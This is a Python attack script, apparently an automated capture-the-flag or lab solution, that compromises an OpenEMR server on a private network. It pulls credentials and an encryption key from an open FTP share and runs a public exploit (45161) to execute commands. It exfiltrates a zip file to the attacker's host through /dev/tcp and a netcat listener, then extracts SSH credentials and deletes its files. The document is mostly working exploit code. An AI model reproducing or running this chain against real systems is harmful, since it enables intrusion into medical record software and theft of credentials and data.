#!/usr/bin/python3
import os
import time
import re
import multiprocessing
import subprocess
import shutil


def GetCredentials():
	os.system("wget -r ftp://192.168.6.152 2>/dev/null")

	with open("192.168.6.152/share/openemr/tests/test.accounts") as f:
		credentials = f.read()

	user = re.findall("(.*):", credentials)[1]

	password = re.findall(":(.*)", credentials)[1]

	with open("192.168.6.152/share/openemr/sql/keys.sql") as f:
		credentials = f.read()

	passzip = re.findall('"pdfkey", "(.*?)"', credentials)[0]

	return user, password, passzip

def MassAssignment():
	os.system("searchsploit -m php/webapps/45161.py 1>/dev/null")

	os.system(f'python2.7 45161.py -u {user} -p {password} -c "cat < /var/user.zip > /dev/tcp/192.168.6.5/1234" http://192.168.6.152/openemr 1>/dev/null')

	os.remove("45161.py")


def GetPassZip():
	os.system("nc -lvnp 1234 > user.zip")

#	os.system(f"7z x user.zip -p{passZip}")

	subprocess.Popen(["7z", "x","user.zip",f"-p{passZip}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

	time.sleep(1)

	with open("user.lst", "r") as f:
		Cred = f.read()

	Ussh = re.findall('(.*) -', Cred)[0]

	Pssh = re.findall('- (.*)', Cred)[0]

	return Ussh, Pssh

if __name__ == "__main__":

	user ,password, passZip = GetCredentials()

	multiprocessing.Process(target=MassAssignment).start()

	Ussh, Pssh = GetPassZip()

	print(Ussh, Pssh)

	shutil.rmtree("192.168.6.152")

	os.remove("user.zip")

	os.remove("user.lst")
